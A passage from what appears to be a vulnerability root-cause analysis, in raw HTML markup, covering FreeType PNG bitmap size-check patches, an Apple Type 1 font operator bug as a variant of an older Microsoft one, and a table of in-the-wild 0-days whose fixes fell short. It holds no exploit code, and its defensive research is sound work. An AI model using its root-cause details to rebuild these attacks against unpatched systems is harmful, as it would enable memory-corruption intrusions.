&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;256&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;/* reject too large bitmaps similarly to the rasterizer */&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c14"&gt;if&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;(&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2 c14"&gt;rows &lt;/span&gt;&lt;span class="c1 c14"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c14"&gt;0x7FFF&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;||&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1 c14"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2 c14"&gt;width &lt;/span&gt;&lt;span class="c1 c14"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c14"&gt;0x7FFF&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c14"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; error &lt;/span&gt;&lt;span class="c1 c14"&gt;=&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;FT_THROW&lt;/span&gt;&lt;span class="c1 c14"&gt;(&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c14"&gt;Array_Too_Large&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c14"&gt;goto&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c14"&gt;DestroyExit&lt;/span&gt;&lt;span class="c1 c14"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c14"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; size &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;rows &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;pitch&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c15"&gt;&amp;lt;-&lt;/span&gt;&lt;span class="c2 c4 c15"&gt;&amp;nbsp;overflow size&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; error &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;ft_glyphslot_alloc_bitmap&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;slot&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;size &lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;error &lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;goto&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;DestroyExit&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c25 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c25 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span class="c11 c4"&gt;To patch CVE-2020-15999, the vulnerability exploited in the wild in 2020, this check was moved up earlier in the `Load_Sbit_Png` function and changed to `imgHeight` and `imgWidth`, the width and height values that are included in the header of the PNG. &lt;/span&gt;&lt;/p&gt;&lt;p class="c25 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.7619df884503092ed17583662f4823868b1905a5"&gt;&lt;/a&gt;&lt;a id="t.10"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;populate_map_and_metrics &lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18 c14"&gt;/* reject too large bitmaps similarly to the rasterizer */&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c14"&gt;if&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;(&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;imgWidth &lt;/span&gt;&lt;span class="c1 c14"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c14"&gt;0x7FFF&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;||&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;imgHeight &lt;/span&gt;&lt;span class="c1 c14"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c14"&gt;0x7FFF&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c14"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; error &lt;/span&gt;&lt;span class="c1 c14"&gt;=&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;FT_THROW&lt;/span&gt;&lt;span class="c1 c14"&gt;(&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c14"&gt;Array_Too_Large&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c14"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c14"&gt;goto&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c14"&gt;DestroyExit&lt;/span&gt;&lt;span class="c1 c14"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;span class="c2 c14"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c14"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c14"&gt;+&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;metrics&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;width &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;FT_UShort&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;imgWidth&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;metrics&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;height &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;FT_UShort&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c2"&gt;imgHeight&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;width &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;metrics&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;width&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;rows &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;metrics&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;height&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;pixel_mode &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;FT_PIXEL_MODE_BGRA&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;pitch &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;width &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;4&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;map&lt;/span&gt;&lt;span class="c1"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2"&gt;num_grays &amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;256&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c18 c10"&gt;/* reject too large bitmaps similarly to the rasterizer */&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c10"&gt;if&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c10"&gt;(&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1 c10"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2 c10"&gt;rows &lt;/span&gt;&lt;span class="c1 c10"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c10"&gt;0x7FFF&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c10"&gt;||&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;map&lt;/span&gt;&lt;span class="c1 c10"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="c2 c10"&gt;width &lt;/span&gt;&lt;span class="c1 c10"&gt;&amp;gt;&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20 c10"&gt;0x7FFF&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c10"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c10"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; error &lt;/span&gt;&lt;span class="c1 c10"&gt;=&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;FT_THROW&lt;/span&gt;&lt;span class="c1 c10"&gt;(&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c10"&gt;Array_Too_Large&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1 c10"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c10"&gt;goto&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c10"&gt;DestroyExit&lt;/span&gt;&lt;span class="c1 c10"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1 c10"&gt;-&lt;/span&gt;&lt;span class="c2 c10"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1 c10"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;[...]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span class="c11 c4"&gt;To summarize: &lt;/span&gt;&lt;/p&gt;&lt;ul style='padding: 0;' class="c41 lst-kix_ir94vkdxrs7o-0 start"&gt;&lt;li style='margin-left: 46pt;' class="c0 c3 c22 li-bullet-0"&gt;&lt;span&gt;CVE-2014-9665 caused a buffer overflow by overflowing the size field in the &lt;/span&gt;&lt;span class="c23"&gt;size = map-&amp;gt;rows * map-&amp;gt;pitch;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;calculation.&lt;/span&gt;&lt;/li&gt;&lt;li style='margin-left: 46pt;' class="c0 c22 c3 li-bullet-0"&gt;&lt;span&gt;CVE-2020-15999 caused a buffer overflow by truncating &lt;/span&gt;&lt;span class="c23"&gt;metrics-&amp;gt;width&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c23"&gt;metrics-&amp;gt;height&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;which are then used to calculate the size field, thus causing the size field to be too small.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;A fix for the root cause of the buffer overflow in November 2014 would have been to bounds check &lt;/span&gt;&lt;span class="c23"&gt;imgWidth&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c23"&gt;imgHeight&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;prior to any assignments to an unsigned short. Including the bounds check of the height and widths from the PNG headers early would have prevented both manners of triggering this buffer overflow. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c36 c3" id="h.c0g67ylrwoty"&gt;&lt;span&gt;Apple Safari CVE-2020-27930&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;This vulnerability is slightly different than the rest in that while it&amp;rsquo;s still a variant, it&amp;rsquo;s not clear that by current disclosure norms, one would have necessarily expected Apple to have picked up the patc&lt;/span&gt;&lt;span&gt;h. Apple and Microsoft both forked the Adobe Type Manager code over 20 years&lt;/span&gt;&lt;span&gt;&amp;nbsp;ago&lt;/span&gt;&lt;span class="c11 c4"&gt;. Due to the forks, there&amp;rsquo;s no true &amp;ldquo;upstream&amp;rdquo;. However when vulnerabilities were reported in Microsoft&amp;rsquo;s, Apple&amp;rsquo;s, or Adobe&amp;rsquo;s fork, there is a possibility (though no guarantee) that it was also in the others.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;CVE-2020-27930 vulnerability was used in an exploit chain for iOS. The &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="http://bugs.chromium.org/p/project-zero/issues/detail?id=180"&gt;variant, CVE-2015-0993, was reported&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to Microsoft in November 2014. In CVE-2015-0993, the vulnerability is in the &lt;/span&gt;&lt;span class="c23"&gt;blend&lt;/span&gt;&lt;span&gt;&amp;nbsp;operator in Microsoft&amp;rsquo;s implementation of Adobe&amp;rsquo;s Type 1/2 Charstring Font Format. The &lt;/span&gt;&lt;span class="c23"&gt;blend&lt;/span&gt;&lt;span&gt;&amp;nbsp;operation takes &lt;/span&gt;&lt;span class="c23"&gt;n + 1&lt;/span&gt;&lt;span&gt;&amp;nbsp;parameters. The vulnerability is that it did not validate or handle correctly when &lt;/span&gt;&lt;span class="c23"&gt;n&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;is negative, allowing the font to arbitrarily read and write on the native interpreter stack. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://support.apple.com/en-us/HT211929"&gt;CVE-2020-27930&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the vulnerability exploited in-the-wild in 2020, is very similar. The vulnerability this time is in the &lt;/span&gt;&lt;span class="c23"&gt;callothersubr&lt;/span&gt;&lt;span&gt;&amp;nbsp;operator in Apple&amp;rsquo;s implementation of Adobe&amp;rsquo;s Type 1 Charstring Font Format. In the same way as the vulnerability reported in November 2014, &lt;/span&gt;&lt;span class="c23"&gt;callothersubr&lt;/span&gt;&lt;span&gt;&amp;nbsp;expects &lt;/span&gt;&lt;span class="c23"&gt;n&lt;/span&gt;&lt;span&gt;&amp;nbsp;arguments from the stack. However, the function did not validate nor handle correctly negative values of &lt;/span&gt;&lt;span class="c23"&gt;n&lt;/span&gt;&lt;span class="c11 c4"&gt;, leading to the same outcome of arbitrary stack read/write. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Six years after the original vulnerability was reported, a similar vulnerability was exploited in a different project. This presents an interesting question: &lt;/span&gt;&lt;span&gt;How do&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;related, but separate, projects stay up-to-date on security vulnerabilities that likely exist in their fork of a common code base? There&amp;rsquo;s little doubt that reviewing the vulnerability Microsoft fixed in 2015 would help the attackers discover this vulnerability in Apple.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c9 c3" id="h.4ehznvuodkxx"&gt;&lt;span class="c27 c4"&gt;Exploited 0-days not properly fixed&amp;hellip; &amp;#x1f62d;&lt;/span&gt;&lt;/h1&gt;&lt;p class="c0 c3"&gt;&lt;span class="c11 c4"&gt;Three vulnerabilities that were exploited in-the-wild were not properly fixed after they were reported to the vendor. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.edf72bcd4c78a28db713eae74fa87ed90f591310"&gt;&lt;/a&gt;&lt;a id="t.11"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Product&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Vulnerability that was exploited in-the-wild&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;2nd patch&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Internet Explorer&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-0674&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-0968&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Google Chrome&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c4 c11"&gt;CVE-2019-13764*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-6383&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c26"&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;Microsoft Windows&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-0986&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;CVE-2020-17008/CVE-2021-1648&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c35"&gt;&lt;td class="c38" colspan="3" rowspan="1"&gt;&lt;p class="c25"&gt;&lt;span class="c11 c4"&gt;* when CVE-2019-13764 was patched, it was not known to be exploited in-the-wild&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c36 c3" id="h.1vbp8s70d1dn"&gt;&lt;span class="c33 c4"&gt;Internet Explorer JScript CVE-2020-0674&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In the section above, we detailed the timeline of the Internet Explorer JScript vulnerabilities that were exploited in-the-wild. After the most recent vulnerability, CVE-2020-0674, was exploited in January 2020, it still didn&amp;rsquo;t comprehensively fix all of the variants. Microsoft patched &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" 